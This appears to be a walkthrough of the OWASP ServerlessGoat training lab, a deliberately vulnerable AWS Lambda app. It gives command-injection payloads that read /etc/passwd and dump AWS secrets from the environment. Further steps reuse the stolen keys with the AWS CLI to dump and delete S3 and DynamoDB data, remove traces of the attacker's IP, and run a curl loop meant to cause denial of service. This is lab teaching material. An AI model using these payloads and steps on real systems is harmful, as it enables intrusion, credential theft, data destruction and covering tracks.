# serverless-goat Walkthrough

*Still to add **INSTALL/REMOVAL** steps*

## Lambda Function API
1. Locate the Endpoint URL under CloudFormation Outputs
2. Navigate to URL in a separate browser  
The endpoint loads an OWASP ServerlessGoat page containing a form consisting of 
      * a single user input textbox and submit button  
      * a list of potential vulnerabilities  
3. Click Submit with the currrent value in place  
This loads a A Poison Tree poem with a URL that seems remarkably close to an s3 bucket address  
**Save this URL For Later, or skip to ###S3 Bucket Access with No Credentials see it's use now**

## Information Gathering
1. Click back on the browser to return to the page 
2. Attempt **Function Data Injection** by adding code to the end of the URL  
*e.g. try adding*`; pwd`
3. Click submit to load the original poem as well as **Improper Exception Handling and Verbose Error**  
  *this appears to be vulnerable to __Function Data Injection__*
### Improved injection attempts
1. Click back and change the URL form to a URL that doesn't contain a doc file followed by a snippet of code  
e.g. `https://inject; pwd`
2. Click submit to load the current working directory */var/task* 
3. Repeat this tasks with the following bash code add for more information resulting from **Over-Privileged Function Permissions**  
**Document everything for later**    
`https://inject; whoami`
   *Current user should be sbx-user0666 or similar*   
`https://inject; ls -la`
    *Lists the current directory (index.js + node_modules subdirectory)*   
`https://inject; cat /etc/passwd` 
  *Lists current users*  
`https://inject; cat index.js`
    *Provides code for basic information on how this page functions*   
    Important information to be gathered from this file includes
      * Database 
      * S3 bucket Put permissions
      * node.js package used 
      * Table information 
      * Permissions to curl (potentially) 
      * Output URL 
 4. Explore file contents  
 `https://inject; cat node_modules/.bin/uuid`   
 USAGE: `uuid [ver] [options]` + some encryption math used to generate keys  
 this doesn't seem to be entirely random
 5. Read more javascript
  `https://inject; cat node_modules/node-uuid/package.json`  
  *lists package version*  
  Research into this version of UUID results in a known vulnerability to insecure randomness  
  **TL:DR;** math.random can produce predictable values and this in an **Insecure 3rd Party Dependency**  
  keys generated and for storage in the s3 bucket may be predicted  
  This could be *very* interesting if it was used to store PII, but it isn't for this circumstance  
 6. Check for unsecured environmental variables  
 `https://inject; env`  
 Results in **Insecure Application Secrets Storage**: 
       * aws_session_token
       * aws_secret_access_key
       * aws_access_key
       * table name
       * s3 bucket name

### S3 Bucket Access with No Credentials
1. Explore the bucket address by opening a new tab, and copying/pasting the URL in the old tab with modifications  
    * URL Modifications for the 2nd tab:  
      - remove the last portion of the URI (e.g. /a3243c-321c-9d21-342f3ebc2a09)  
      - change the s3-website-us-east-1.amazonaws.com to be a correct bucket address (s3.amazonaws.com)
2. Now that the URL modifications have been made, load the s3 bucket  
This site contains information concerning the s3 bucket contents, and each Key listed can be added to the URL as a path  
This site does has a **Broken Authentication** vulnerability because it does not require any authorization for access  
This site also contains the **Insecure Serverless Deployment Configuration** vulerability for the following reasons
      * The s3 bucket URL should not be easy to infer
      * This page should be secured and encrypted instead of being publicly accessible 
Return to the previous tab

### Enumeration
#### Node.js Access Enumeration
Attempt to access content/information using Node.js  
1. What version of node.js?  
`https://; node -e 'const AWS = require(\"aws-sdk\"); (async () => {console.log("Running Node.js" + process.version))})();'`
2. Can the database be scanned?  
`https://; node -e 'const AWS = require(\"aws-sdk\"); (async () => {console.log(await new AWS.DynamoDB.DocumentClient().scan({TableName: process.env.TABLE_NAME}).promise());})();'`
3. Can the database be queried?
4. Does GetItem work?
5. Does PutItem work?
6. Does UpdateItem work?
??? Do I enumerate all the things? Can I automate this?
7. Can the s3 buckets be scanned?

#### Profile Enumeration
1. Using the information found in the env variables create a user profile 
`aws configure profile --user666`  
    * aws_secret_access_key    
    * aws_access_key   
    * us-east-1
2. Add the aws_session_token to the end of the user profile configuration by editing the *~/.aws/credentials* file  
`vim ~/.aws/credentials`  
`aws_session_token = <aws_session_token>`
3. Obtain current profile information 
`aws sts get-caller-identity --profile user666`  
**Improper Exception Handling and Verbose Errors**
4. How do I discover information about this profile/user/permissions/roles?

#### Database Actions Enumeration
1. Attempt to DescribeTable

2. Attempt to scan the database contents  
`aws dynomodb scan --table-name <table-name> --profile user`
3. Attempt to Query the database
4. Attempt to GetItem
5. Attempt to DeleteItem
6. Attempt to UpdateItem
7. Attempt to BatchWriteItem
8. Attempt to BatchGetItem
9. What other DB action policies are there to be enumerated?

#### S3 Bucket Actions Enumeration
1. Attempt ListBucket
`aws s3 ls <s3-bucket> --profile user` 
2. Attempt GetBucketLocation
3. Attempt GetLifecycleConfiguration
4. Attempt PutLifecycleConfiguration
5. Attempt GetObject
6. Attempt GetObjectAcl
7. Attempt GetObjectVersion
8. Attempt PutObject
9. Attempt PutObjectAcl
2. Attempt to download bucket contents  
`aws s3 sync s3://<s3-bucket> . --profile user`
3. Review downloaded bucket content  
`ls -la`
4. Display commands run via Lambda Function
`cat <key>`
5. Attempt to delete bucket contents  
`aws s3api delete-object --bucket <s3-bucket> --key <key> --profile`
6. Remove all traces of requests by your IP address by repeated step 5 for each key value found  

### DoS Attack
Create a simple bash script to curl the site multiple times   
This will demonstrate the serverless function going from reachable to unreachable  
*internal server errors* are proof of a successful DoS Attack
1. Start with the http address after a function is sent  
(https://<x>.execute-api.us-east-1.amazonaws.com/Prod/api/convert?document_url=)
2. Copy the address between brackets, URL encode it, and then add to the end of the address 
3. Repeat Step 2 5x for the <http-address> value, which will perform the DoS
4. The run the following bash script  
``` bash
for i in {1.100}; do  
  echo $i  
  curl -L <http-address>  
done
```

